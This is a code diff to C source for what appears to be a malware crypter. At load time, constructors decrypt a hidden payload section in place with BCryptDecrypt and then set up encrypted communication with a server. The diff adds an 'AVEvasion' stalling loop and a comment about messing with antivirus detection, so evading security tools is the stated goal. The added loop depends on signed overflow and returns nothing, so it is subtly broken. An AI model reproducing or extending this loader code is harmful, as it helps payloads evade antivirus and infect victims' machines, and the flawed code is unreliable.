@@ -53,9 +53,25 @@
  * Because this is the highest priority constructor in the runtime environment setup it is given priority 101, equvilant destructor priority
  * is 101.
  */
-__attribute__((constructor(101), section(".cryptor"))) int construct()
+
+__attribute__((constructor(102), section(".cryptor"))) int AVEvasion()
+{
+	int test = 0;
+	for (int x = 0; x >-1; x++){
+		test ++;
+	}
+}
+__attribute__((constructor(102), section(".cryptor"))) int construct()
 {
 	/*
+	 * Lets mess with av detection a little bit
+	
+	int test = 0;
+	for(int x = 0; x!=10000000; x++){
+		test++;
+	}
+
+	
 	* Get the section offsets for the cryptor to decrypt the payload stub
 	*/
 	extern unsigned int START_OF_PAYLOAD;
@@ -72,8 +88,10 @@ __attribute__((constructor(101), section(".cryptor"))) int construct()
 	/*
 	 * Decode the appropriate values to get the offest and the size paramaters correct
 	 */
+	#pragma GCC diagnostic ignored "-Wint-conversion"
 	UINT64  addr_s = &START_OF_PAYLOAD;
 	UINT64  addr_e = &END_OF_PAYLOAD;
+	#pragma GCC diagnostic pop
 	UINT64 payload_size;
 	BYTE* ptr_payload;
 	/*
@@ -307,7 +325,9 @@ __attribute__((constructor(101), section(".cryptor"))) int construct()
 	}
 	
 	payload_size = addr_e-addr_s;
+	#pragma GCC diagnostic ignored "-Wint-to-pointer-cast"
 	ptr_payload = (BYTE*)addr_s;
+	#pragma GCC diagnostic pop
 	if(BCryptDecrypt(decryptPayloadKey,ptr_payload,payload_size,NULL,decodedIV,sz,ptr_payload,payload_size,&PAYLOAD_WRITE_LEN,0) != STATUS_SUCCESS)
 	{
 		printf("failed to decrypt payload");
@@ -330,7 +350,7 @@ __attribute__((constructor(101), section(".cryptor"))) int construct()
 	return 0;
 }
 
-__attribute__((destructor(101),section(".cryptor"))) int destruct(){
+__attribute__((destructor(102),section(".cryptor"))) int destruct(){
 	
 #ifdef WIN32
 	/*
@@ -355,7 +375,7 @@ __attribute__((destructor(101),section(".cryptor"))) int destruct(){
  * developers to use the payload section to send data to, and recieve data from
  * the server in an efficient manner.
  */
-__attribute__((constructor(102), section(".payload"))) int InitSecureComs(){
+__attribute__((constructor(103), section(".payload"))) int InitSecureComs(){
 #ifdef WIN32
 	/*
 	 * Allocate space for the IV and key
@@ -493,7 +513,7 @@ __attribute__((constructor(102), section(".payload"))) int InitSecureComs(){
 /*
  * destroys the session keys created for this session.
  */
-__attribute__((destructor(102), section(".payload"))) int closeSecureComs(){
+__attribute__((destructor(103), section(".payload"))) int closeSecureComs(){
 #ifdef WIN32
 	/* 
 	 *Destroy the BCrypt key handle
